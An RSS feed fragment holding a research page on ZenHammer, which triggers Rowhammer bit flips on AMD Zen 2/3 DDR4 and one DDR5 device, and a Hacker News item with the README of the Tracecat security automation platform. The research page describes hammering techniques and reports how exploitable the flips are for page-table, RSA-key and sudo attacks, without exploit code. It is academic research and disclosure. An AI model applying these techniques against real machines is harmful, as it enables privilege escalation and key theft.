<p><a href="https://comsec.ethz.ch/wp-content/files/zenhammer_sec24.pdf">Our work</a> shows that it is possible to <strong>trigger Rowhammer bit flips on DDR4 devices on AMD Zen 2 and Zen 3</strong> <strong>systems</strong> despite deployed TRR mitigations. This result proves that <strong>AMD systems are equally vulnerable to Rowhammer as Intel systems</strong>, which greatly increases the attack surface, considering today’s AMD market share of around 36% on x86 desktop CPUs. This poses a significant risk as DRAM devices in the wild cannot easily be fixed, and previous work showed that Rowhammer attacks are practical, for example,&nbsp;<a href="https://comsec.ethz.ch/research/dram/smash/" target="_blank" rel="noreferrer noopener">in the browser</a>,&nbsp;<a href="https://comsec.ethz.ch/wp-content/files/drammer.pdf" target="_blank" rel="noreferrer noopener">on smartphones</a>,&nbsp;<a href="https://comsec.ethz.ch/wp-content/files/flip-feng-shui_sec16.pdf" target="_blank" rel="noreferrer noopener">across VMs</a>, and even&nbsp;<a href="https://comsec.ethz.ch/wp-content/files/throwhammer_atc18.pdf" target="_blank" rel="noreferrer noopener">over the network</a>. Furthermore, we show that ZenHammer can trigger <strong>Rowhammer bit flips on a DDR5 device for the first time</strong>.</p>



<p>Our results show a high number of bit flips on Zen 2 and Zen 3 systems. Also, devices are more vulnerable on Zen 3 than Coffee Lake, simplifying exploitation. We can build the page table, RSA public key corruption, and sudo exploits from prior work on 7/6/4 of these devices, taking, on average, just 164/267/209 seconds.</p>



<h2>How did you do it?</h2>



<p>We reverse-engineered the <strong>secret DRAM address functions </strong>by adopting the <a href="https://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper_pessl.pdf">DRAMA</a> technique for AMD systems. We found that the timing routine must be changed for more reliable results. We make the key observation that a physical offset must be applied to physical addresses before recovering the DRAM address functions due to system address remapping (see <strong>Figure 1</strong>). This allows us to recover the address functions completely. However, using these address functions gives us very few bit flips on 5 and 0 of 10 devices on AMD Zen 2 and Zen 3, respectively, as we show in <strong>Table 1</strong>.</p>



<figure><table><tbody><tr><td><strong>Fig. 1:</strong> Remapping of higher address ranges to unused parts of physical memory on Intel and AMD CPUs. The Top of Memory (TOM) is the system’s highest addressable memory location.</td><td><strong>Table 1:</strong> Result of running Blacksmith on AMD Zen 2 and Zen 3 systems, compared to our Intel Coffee Lake baseline. We report for each device the number of patterns found (|P+|) and the number of bit flips over all patterns (|F_fuzz|). We omit devices without any bit flips.</td></tr><tr><td><img decoding="async" src="https://comsec.ethz.ch/wp-content/uploads/2024/03/20240319_141734_ZenHammer-watermarked@2x-1024x495.png" alt=""></td><td><img decoding="async" src="https://comsec.ethz.ch/wp-content/uploads/2024/03/20240319_154517_paper@2x-1024x567.png" alt=""></td></tr></tbody></table></figure>



<p>We started by looking at the <strong>refresh synchronization</strong>, which previous work (e.g., <a href="https://comsec.ethz.ch/research/dram/smash/">SMASH</a>, <a href="https://comsec.ethz.ch/research/dram/blacksmith/">Blacksmith</a>) showed to be important for triggering bit flips. We demonstrate that continuous timing measurements using non-repeating rows are effective for precise and reliable refresh synchronization on AMD. The result in<strong> Listing 1</strong> shows our improved refresh synchronization method.</p>



<figure><table><tbody><tr><td></td><td data-align="center"><strong>Listing 1</strong>. Our continuous, non-repeating refresh synchronization.</td></tr><tr><td></td><td data-align="center"><img decoding="async" src="https://comsec.ethz.ch/wp-content/uploads/2024/03/20240319_160700_paper@2x-1024x463.png" alt=""></td></tr></tbody></table></figure>



<p>We found out that the <strong>activation rate of non-uniform Rowhammer patterns </strong>on AMD Zen+/3 systems is significantly lower than on Intel Coffee Lake (see <strong>Figure 2</strong>). To investigate this, we conducted a series of experiments to find the optimal hammering <strong>instruction sequence</strong>. Our results showed that regular loads (<code>MOV</code>) with <code>CLFLUSHOPT</code> for flushing aggressors from the cache, issued immediately after accessing an aggressor (“scatter” style), is optimal. It further revealed that, unlike on Zen 2, explicit fencing after flushing is not required on Zen 3.</p>



<figure><table><tbody><tr><td data-align="center"><strong>Fig. 2:</strong> Distribution of the activation rates of non-uniform hammering patterns on Z+, Z3, and Intel Coffee Lake (CL). The whiskers indicate the minimum and maximum values.</td></tr><tr><td data-align="center"><img decoding="async" src="https://comsec.ethz.ch/wp-content/uploads/2024/03/20240319_141813_ZenHammer-watermarked@2x-1024x341.png" alt=""></td></tr></tbody></table></figure>



<p>We further investigated how different <strong>fence types and fence scheduling policies</strong> affect Rowhammer patterns on AMD Zen systems. For this, we came up with six different pattern-aware and cache-avoiding fence scheduling policies (see <strong>Table 2</strong>) and tested them on our devices for 6 hours each to determine the device’s optimal policy. We found that on most devices on Zen 2 the policy SP_none is optimal while SP_pair is in most cases better suited on Zen 3.</p>



<figure><table><tbody><tr><td data-align="center"><strong>Table 2:</strong> Overview of our proposed fence scheduling policies. We indicate which policies are pattern-aware by taking the pattern’s structure into account and which are cache-avoiding.</td></tr><tr><td data-align="center"><img decoding="async" src="https://comsec.ethz.ch/wp-content/uploads/2024/03/20240319_164041_paper@2x-1024x666.png" alt=""></td></tr></tbody></table></figure>



<h2>How bad is it?</h2>



<p>For our <strong>evaluation</strong>, we considered a test pool of 10x DDR4 DRAM devices covering the three major manufacturers (Samsung, Micron, SK Hynix). We let our ZenHammer fuzzer run for 3 hours with each fence type (mfence, sfence) and fence scheduling policy. After each run, the best pattern is determined by using a minisweep over 4 MiB with all found patterns. Thereafter, we <em>swept</em> the best pattern of the best policy over a contiguous memory area of 256 MB and reported the number of bit flips. The results in <strong>Table 3</strong> show that our ZenHammer fuzzer is able to trigger bit flips on 7 (Zen 2) and 6 (Zen 3) of 10 DDR4 DRAM devices.</p>



<figure><table><tbody><tr><td data-align="center"><strong>Table 3:</strong> ZenHammer results on AMD Zen 2 and Zen 3 as well as Intel Coffee Lake. For each of our devices, we report the best scheduling policy (SP_opt) and both the number of effective patterns (|P+|) and bit flips (|F_fuzz|) we found while fuzzing with the best policy. We also show the number of bit flips found when sweeping the best patterns over a 256 MiB range (|F_swp|).</td></tr><tr><td data-align="center"><img decoding="async" src="https://comsec.ethz.ch/wp-content/uploads/2024/03/20240319_144633_paper@2x-1024x447.png" alt=""></td></tr></tbody></table></figure>



<p>We evaluated the <strong>exploitability</strong> of these bit flips based on three attacks from <a href="https://comsec.ethz.ch/wp-content/files/hammertime_raid18.pdf" target="_blank" rel="noreferrer noopener">previous work</a>: (i) an attack targeting the page frame number of a page table entry (PTE) to pivot it to an attacker-controlled page table page, (ii) an attack on the RSA-2048 public key that allows recovering the associated private key used to authenticate to an SSH host, (iii) and an attack on the password verification logic of the <code>sudoers.so</code> library that enables gaining root privileges. We report the results in <strong>Table 4</strong>. </p>



<figure><table><tbody><tr><td><strong>Table 4:</strong> Analysis of the bit flip exploitability found during the sweep over 256 MiB on AMD Zen 2, Zen 3, and Intel Coffee Lake. For each attack, we indicate the number of exploitable bit flips (#Ex.) and the average time to find an exploitable bit flip (Time). We mark DIMMs with a single exploitable bit flip by (*). We omit DIMMs without any exploitable bit flips.</td></tr><tr><td><img decoding="async" src="https://comsec.ethz.ch/wp-content/uploads/2024/03/20240319_142711_paper@2x-1024x264.png" alt=""></td></tr></tbody></table></figure>



<h2>What about DDR5?</h2>



<p>Finally, we tried ZenHammer on DDR5 by reverse engineering the DRAM functions on AMD Zen 4 and evaluating ten DDR5 devices. Out of these ten devices, ZenHammer could trigger ~42k flips on one device. <strong>This is the first public report of DDR5 bit flips on commodity systems in the wild</strong>. However, given that ZenHammer could not trigger flips on nine out of ten devices, we conclude that more research is necessary to find more effective patterns for DDR5 devices.</p>



<h2>Further Information</h2>



<p>For full details and more information about our work, please have a look at our&nbsp;<a href="https://comsec.ethz.ch/wp-content/files/zenhammer_sec24.pdf">paper</a>, which is to appear at&nbsp;<a href="https://www.usenix.org/conference/usenixsecurity24/">USENIX Security 2024</a> in August 2024. Our ZenHammer fuzzer is available on <a href="https://github.com/comsec-group/zenhammer">Github</a>.</p>



<h2>FAQs</h2>



<p>Following, we provide answers to the most frequently asked questions about our work.</p>



<p><strong>Why has nobody paid any attention to AMD systems before?</strong><br>We believe that AMD received little attention as the <a href="https://dl.acm.org/doi/pdf/10.1145/2678373.2665726">original work</a> on Rowhammer by Kim et al. showed a much higher number of bit flips on Intel systems and subsequent work also focused primarily on Intel. Further, there is much more known about the microarchitecture of Intel CPUs compared to AMD CPUs.</p>



<p><strong>Are there any DDR4 devices that are safe?</strong><br>Not likely. We could not trigger any bit flips on 3 and 4 of our 10 devices on Zen 2 and Zen 3, respectively. However, given that we triggered only a few bit flips on them on Intel Coffee Lake as well, we think that tuning the fuzzer further may expose bit flips on these devices too. </p>



<p><strong>Why does your evaluation consider ten devices only?</strong><br>Because we have a limited number of AMD Zen 2/3 machines in our lab and some of our experiments took a long time, we have decided to reduce the number of devices to ten. We made sure that our randomly chosen subset includes devices from all three major DRAM vendors.</p>



<p><strong>How can I check whether my DRAM is vulnerable?</strong><br>The code of our ZenHammer fuzzer, which you can use to assess your DRAM device for bit flips on AMD Zen 2/3/4 CPUs, is available on&nbsp;<a href="https://github.com/comsec-group/zenhammer" target="_blank" rel="noreferrer noopener">GitHub</a>.</p>



<p><strong>Why has JEDEC not fixed this issue yet?</strong><br>By now we know, thanks to a better understanding, that solving Rowhammer is hard but not impossible, as we show in our previous work <a href="https://comsec.ethz.ch/research/dram/protrr/">ProTRR</a> and <a href="https://comsec.ethz.ch/research/dram/rega/">REGA</a>. We believe that there is a lot of bureaucracy inside JEDEC that makes it difficult to properly address Rowhammer.</p>



<p><strong>What about DIMMs with Error Correction Codes (ECC)?</strong><br><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=8835222" target="_blank" rel="noreferrer noopener">Previous work</a>&nbsp;on DDR3 showed that ECC cannot provide protection against Rowhammer. Due to the even larger number of bit flips in current DDR4 devices, we believe that ECC cannot provide complete protection against Rowhammer but just makes exploitation harder.</p>



<p><strong>What if my system runs with a double refresh rate?</strong><br>Besides an increased performance overhead and power consumption, previous work (e.g.,&nbsp;<a href="https://arxiv.org/abs/1904.09724" target="_blank" rel="noreferrer noopener">Mutlu et al.</a>&nbsp;and&nbsp;<a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=9152631" target="_blank" rel="noreferrer noopener">Frigo et al.</a>) showed that doubling the refresh rate is a weak solution not providing complete protection.</p>



<h2>Responsible Disclosure</h2>



<p>Rowhammer is a known industry-wide issue, and we did not see a need to go through the typical disclosure process. Nonetheless, we informed AMD on February 26, 2024, and at their request, we did not publicly disclose the issue until March 25, 2024. This page was briefly online by mistake on March 21.</p>



<h2>Acknowledgments</h2>



<p>This research was supported by the Swiss National Science Foundation (SNSF) under NCCR Automation, grant agreement 51NF40_180545, by the Swiss State Secretariat for Education, Research and Innovation under contract number MB22.00057 (ERC-StG PROMISE), and by a Microsoft Swiss JRC grant.</p>



<figure><img fetchpriority="high" decoding="async" width="493" height="102" src="https://comsec.ethz.ch/wp-content/uploads/2021/11/nccr-logo.png" alt="" srcset="https://comsec.ethz.ch/wp-content/uploads/2021/11/nccr-logo.png 493w, https://comsec.ethz.ch/wp-content/uploads/2021/11/nccr-logo-300x62.png 300w" sizes="(max-width: 493px) 100vw, 493px"></figure>
					</div><!-- .entry-content -->
				</article><!-- #post -->
							<!-- If has sidebar start -->
		</div>
				<!-- If has sidebar end -->
		</main><!-- .site-main -->
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Tracecat – Open-source security alert automation / SOAR alternative (231 pts)]]></title>
            <link>https://github.com/TracecatHQ/tracecat</link>
            <guid>39819458</guid>
            <pubDate>Mon, 25 Mar 2024 18:05:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/TracecatHQ/tracecat">https://github.com/TracecatHQ/tracecat</a>, See on <a href="https://news.ycombinator.com/item?id=39819458">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><div dir="auto">
  <p dir="auto"><h2 tabindex="-1" dir="auto">
    Open source Tines / Splunk SOAR alternative
  </h2><a id="user-content-----open-source-tines--splunk-soar-alternative--" aria-label="Permalink: 
    Open source Tines / Splunk SOAR alternative
  " href="#----open-source-tines--splunk-soar-alternative--"></a></p>
  <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/TracecatHQ/tracecat/blob/main/img/banner.svg"><img src="https://github.com/TracecatHQ/tracecat/raw/main/img/banner.svg" alt="tracecat"></a>
</p></div>

<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/af1ef7f76a45db6652237b7dee0587e5b37d8f65075e6689310e2ec2c4daa227/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d417061636865253230322e302d626c75653f7374796c653d666f722d7468652d6261646765266c6f676f3d617061636865"><img src="https://camo.githubusercontent.com/af1ef7f76a45db6652237b7dee0587e5b37d8f65075e6689310e2ec2c4daa227/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d417061636865253230322e302d626c75653f7374796c653d666f722d7468652d6261646765266c6f676f3d617061636865" alt="License" data-canonical-src="https://img.shields.io/badge/License-Apache%202.0-blue?style=for-the-badge&amp;logo=apache"></a>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6c26a017b8cecb2296adc66f54bf18616ab09f50829f16566600d30d62f9887c/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6d6d69742d61637469766974792f6d2f547261636563617448512f74726163656361743f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562"><img src="https://camo.githubusercontent.com/6c26a017b8cecb2296adc66f54bf18616ab09f50829f16566600d30d62f9887c/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6d6d69742d61637469766974792f6d2f547261636563617448512f74726163656361743f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562" alt="Commit Activity" data-canonical-src="https://img.shields.io/github/commit-activity/m/TracecatHQ/tracecat?style=for-the-badge&amp;logo=github"></a>
<a href="https://docs.tracecat.com/" rel="nofollow"><img src="https://camo.githubusercontent.com/29aac5757906875ba739ee3b20119878796e795f3118736c8c8727b88cb8f1d4/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f63732d617661696c61626c652d626c75653f7374796c653d666f722d7468652d6261646765266c6f676f436f6c6f723d7768697465" alt="Docs" data-canonical-src="https://img.shields.io/badge/Docs-available-blue?style=for-the-badge&amp;logoColor=white"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/bad4f2eb8bf92e1146448fd81c4ffbfdacd4ddcffbae47d9cae1cda7e6e5bc77/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e6578742e6a732d2532333030303030302e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d6e6578742e6a73266c6f676f436f6c6f723d7768697465"><img src="https://camo.githubusercontent.com/bad4f2eb8bf92e1146448fd81c4ffbfdacd4ddcffbae47d9cae1cda7e6e5bc77/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e6578742e6a732d2532333030303030302e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d6e6578742e6a73266c6f676f436f6c6f723d7768697465" alt="Next.js" data-canonical-src="https://img.shields.io/badge/next.js-%23000000.svg?style=for-the-badge&amp;logo=next.js&amp;logoColor=white"></a>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6d56faef03529ac56db4d6f0945f8deff412674e8ce7a77791fd7e41b771ac4b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f466173744150492d3030353537313f7374796c653d666f722d7468652d6261646765266c6f676f3d66617374617069"><img src="https://camo.githubusercontent.com/6d56faef03529ac56db4d6f0945f8deff412674e8ce7a77791fd7e41b771ac4b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f466173744150492d3030353537313f7374796c653d666f722d7468652d6261646765266c6f676f3d66617374617069" alt="FastAPI" data-canonical-src="https://img.shields.io/badge/FastAPI-005571?style=for-the-badge&amp;logo=fastapi"></a>
<a href="https://docs.pydantic.dev/latest/contributing/#badges" rel="nofollow"><img src="https://camo.githubusercontent.com/b89d5c844ea712be5f9eea1aef2457593316392df08a9e517bc128538eb4ab39/68747470733a2f2f696d672e736869656c64732e696f2f656e64706f696e743f7374796c653d666f722d7468652d62616467652675726c3d68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f707964616e7469632f707964616e7469632f6d61696e2f646f63732f62616467652f76322e6a736f6e" alt="Pydantic v2" data-canonical-src="https://img.shields.io/endpoint?style=for-the-badge&amp;url=https://raw.githubusercontent.com/pydantic/pydantic/main/docs/badge/v2.json"></a>
<a href="https://discord.gg/n3GF4qxFU8" rel="nofollow"><img src="https://camo.githubusercontent.com/0536520f04c43165102009e15d1dd11a79cd4915eea490a745b396dc64ee60f1/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f313231323534383039373632343930333638312e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264266c6f676f436f6c6f723d7768697465" alt="Discord" data-canonical-src="https://img.shields.io/discord/1212548097624903681.svg?style=for-the-badge&amp;logo=discord&amp;logoColor=white"></a></p>
<p dir="auto"><em>Disclaimer: Tracecat is currently in public alpha. If you'd like to use Tracecat in production, please reach out to us on Discord or <a href="mailto:founders@tracecat.com">founders@tracecat.com</a>!</em>
<em>Want to take Tracecat for a spin? Try out our <a href="https://docs.tracecat.com/quickstart" rel="nofollow">tutorials</a> with <a href="https://platform.tracecat.com/" rel="nofollow">Tracecat Cloud</a> or <a href="https://docs.tracecat.com/installation" rel="nofollow">self-hosted</a>.</em></p>
<p dir="auto"><a href="https://tracecat.com/" rel="nofollow">Tracecat</a> is an open source automation platform for security teams. We're building the features of Tines / Splunk SOAR with:</p>
<ul dir="auto">
<li>Enterprise-grade open source tools</li>
<li>Open source AI infra and GPT models</li>
<li><a href="#faq">Practitioner-obsessed UI/UX</a></li>
</ul>
<p dir="auto">It's designed to be simple but powerful. Security automation should be accessible to everyone, <del>including</del> especially understaffed small-to-mid sized teams.</p>
<p dir="auto">Check out our <a href="https://docs.tracecat.com/quickstart" rel="nofollow">quickstart</a> and build your first AI workflow in 15 minutes.
The easiest way to get started is to sign-up for <a href="https://platform.tracecat.com/" rel="nofollow">Tracecat Cloud</a>.
We also support <a href="https://docs.tracecat.com/installation" rel="nofollow">self-hosted</a> Tracecat.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/46541035/315307510-52b822a9-fbd5-4f08-a4ec-54e8fd1b8f02.gif?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE0MDQzMDUsIm5iZiI6MTcxMTQwNDAwNSwicGF0aCI6Ii80NjU0MTAzNS8zMTUzMDc1MTAtNTJiODIyYTktZmJkNS00ZjA4LWE0ZWMtNTRlOGZkMWI4ZjAyLmdpZj9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjUlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI1VDIyMDAwNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUzNDVkN2Q5YjhiZmNhYTgzN2FiYTM0ZjhjNTBhYWFkZTAzZmIyZTZiNzM0OWZhMzdjYTdlYzYxMmY2MDJkY2YmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.6n3Q2l3lb3_b4uM--HXS8-tZ_jpvzMW4rgedFK3hmHY"><img src="https://private-user-images.githubusercontent.com/46541035/315307510-52b822a9-fbd5-4f08-a4ec-54e8fd1b8f02.gif?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE0MDQzMDUsIm5iZiI6MTcxMTQwNDAwNSwicGF0aCI6Ii80NjU0MTAzNS8zMTUzMDc1MTAtNTJiODIyYTktZmJkNS00ZjA4LWE0ZWMtNTRlOGZkMWI4ZjAyLmdpZj9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjUlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI1VDIyMDAwNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUzNDVkN2Q5YjhiZmNhYTgzN2FiYTM0ZjhjNTBhYWFkZTAzZmIyZTZiNzM0OWZhMzdjYTdlYzYxMmY2MDJkY2YmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.6n3Q2l3lb3_b4uM--HXS8-tZ_jpvzMW4rgedFK3hmHY" alt="autocomplete_gif" data-animated-image=""></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Getting started</h2><a id="user-content-getting-started" aria-label="Permalink: Getting started" href="#getting-started"></a></p>
<p dir="auto">Let's automate a phishing email investigation, collect evidence, and generate a remediation plan using AI.
You can follow the <a href="https://docs.tracecat.com/quickstart" rel="nofollow">tutorial here</a>.</p>
<details open="">
  <summary>
    
    <span aria-label="Video description phishing.mov">phishing.mov</span>
    <span></span>
  </summary>

  <video src="https://private-user-images.githubusercontent.com/46541035/315292776-580149cf-624b-4815-a62a-e59bbf61280e.mov?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE0MDQzMDUsIm5iZiI6MTcxMTQwNDAwNSwicGF0aCI6Ii80NjU0MTAzNS8zMTUyOTI3NzYtNTgwMTQ5Y2YtNjI0Yi00ODE1LWE2MmEtZTU5YmJmNjEyODBlLm1vdj9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjUlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI1VDIyMDAwNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWNiMThmYjIyYzc0NjY4NTgzMDYzNmJhZTAxZjkzMDc5MWVmNzliMjNhODU3OTNhZmY5ZjJiZjVmMGU5YmZmMjMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.e0i4TCEwbzDMxuaEclcCxiOaNDJxmA30EyGtfNYatpQ" data-canonical-src="https://private-user-images.githubusercontent.com/46541035/315292776-580149cf-624b-4815-a62a-e59bbf61280e.mov?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE0MDQzMDUsIm5iZiI6MTcxMTQwNDAwNSwicGF0aCI6Ii80NjU0MTAzNS8zMTUyOTI3NzYtNTgwMTQ5Y2YtNjI0Yi00ODE1LWE2MmEtZTU5YmJmNjEyODBlLm1vdj9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjUlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI1VDIyMDAwNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWNiMThmYjIyYzc0NjY4NTgzMDYzNmJhZTAxZjkzMDc5MWVmNzliMjNhODU3OTNhZmY5ZjJiZjVmMGU5YmZmMjMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.e0i4TCEwbzDMxuaEclcCxiOaNDJxmA30EyGtfNYatpQ" controls="controls" muted="muted">

  </video>
</details>

<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<p dir="auto">Build AI-assisted workflows, enrich alerts, and close cases fast.</p>
<ul dir="auto">
<li>Workflows
<ul>
<li> Drag-and-drop builder</li>
<li> Core primitives (webhook, HTTP, if-else, send email, etc.)</li>
<li> AI Actions (label, summarize, enrich etc.)</li>
<li> Secrets</li>
<li> Batch-stream data transforms (expected April 2024)</li>
<li> Formulas (expected May 2024)</li>
<li> Versioning (expected June 2024)</li>
</ul>
</li>
<li>Case management
<ul>
<li> <a href="https://www.rapid7.com/blog/post/2021/02/12/talkin-smac-alert-labeling-and-why-it-matters/" rel="nofollow">SMAC (status, malice, action, context)</a></li>
<li> Suppression</li>
<li> Deduplication (expected 1st week April)</li>
<li> AI-assisted labelling (e.g. MITRE ATT&amp;CK)</li>
<li> Metrics</li>
<li> Analytics dashboard</li>
</ul>
</li>
<li>Event logs
<ul>
<li> Unlimited logs storage</li>
<li> Logs search</li>
<li> Visual detection rules</li>
<li> Piped query language</li>
</ul>
</li>
<li>Data validation
<ul>
<li> <a href="https://github.com/pydantic/pydantic">Pydantic V2</a> for fast data model and input / output validation in the backend</li>
<li> <a href="https://github.com/colinhacks/zod">Zod</a> for fast form and input / output validation in the frontend</li>
</ul>
</li>
<li>Teams
<ul>
<li> Collaboration</li>
<li> Tenants</li>
</ul>
</li>
<li>AI infrastructure
<ul>
<li> Vector database for RAG</li>
<li> LLM evaluation and security</li>
<li> Bring-your-own LLM (OpenAI, Mistral, Anthropic etc.)</li>
</ul>
</li>
</ul>
<p dir="auto">Tracecat is <strong>not</strong> a 1-to-1 mapping of Tines / Splunk SOAR. Our aim is to give technical teams a Tines-like experience, but with a focus on open source and AI features. <a href="#what-does-ai-native-mean">What do we mean by AI-native?</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto">Tracecat is Cloud agnostic and deploys anywhere that supports Docker.
Learn how to <a href="https://docs.tracecat.com/installation" rel="nofollow">install Tracecat locally</a>.</p>
<ul>
<li> Authentication
<ul>
<li> Supabase</li>
<li> Auth.js</li>
<li> Supertokens</li>
</ul>
</li>
<li> Deployment
<ul>
<li> Docker Compose</li>
<li> AWS</li>
<li> Azure</li>
<li> GCP</li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Is Tracecat enterprise ready?</h2><a id="user-content-is-tracecat-enterprise-ready" aria-label="Permalink: Is Tracecat enterprise ready?" href="#is-tracecat-enterprise-ready"></a></p>
<p dir="auto"><em>We are currently in Public Alpha. We don't recommend using Tracecat for production until Public Beta is out! Nevertheless, we are building remarkably fast and expect to get there in the next 3-4 months.</em></p>
<p dir="auto">There are two "flavors" of Tracecat.
Tracecat Embedded, which runs on a single instance and scales vertically, and Tracecat Distributed, which scales horizontally with self-healing / resillience.
Tracecat Embedded is designed to run automation workflows, store event logs, and run search queries with <em>extreme</em> efficiency on a single instance (e.g. EC2, laptop).</p>
<p dir="auto">Embedded Tracecat should already scale beyond Tines' free tier (3 workflows, 500 workflow runs daily) given sufficient memory, cpu, and network capacity.
With Tracecat on <a href="https://github.com/quickwit-oss/quickwit">Quickwit</a>, you can also store events logs in S3 at unlimited scale and time length.</p>
<p dir="auto">For enterprise use-cases that require 99.99% SLAs, however, we recommend waiting for Tracecat Distributed!</p>
<ul>
<li> Embedded architecture
<ul>
<li> Flunk: homegrown workflow engine based on Flink</li>
<li> LanceDB</li>
<li> Polars</li>
<li> Tantivy</li>
</ul>
</li>
<li> Distributed architecture
<ul>
<li> Apache Flink</li>
<li> LanceDB / Lantern</li>
<li> Quickwit</li>
</ul>
</li>
</ul>
<p dir="auto">If you'd like to stress test Tracecat, please ping us on <a href="https://discord.gg/n3GF4qxFU8" rel="nofollow">Discord</a> and we can help you get started!</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Status</h2><a id="user-content-status" aria-label="Permalink: Status" href="#status"></a></p>
<ul>
<li> Public Alpha: Anyone can sign up over at <a href="https://tracecat.com/" rel="nofollow">tracecat.com</a> but go easy on us, there are kinks and we are just getting started.</li>
<li> Public Beta: Stable enough for most non-enteprise use-cases</li>
<li> Public: Production-ready</li>
</ul>
<p dir="auto">We're currently in Public Alpha.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Community &amp; Support</h2><a id="user-content-community--support" aria-label="Permalink: Community &amp; Support" href="#community--support"></a></p>
<p dir="auto">Join us in building a newer, more open, kind of automation platform.</p>
<ul dir="auto">
<li><a href="https://discord.gg/n3GF4qxFU8" rel="nofollow">Tracecat Discord</a> for hanging out with the community</li>
<li><a href="https://github.com/TracecatHQ/tracecat/issues">GitHub issues</a></li>
</ul>
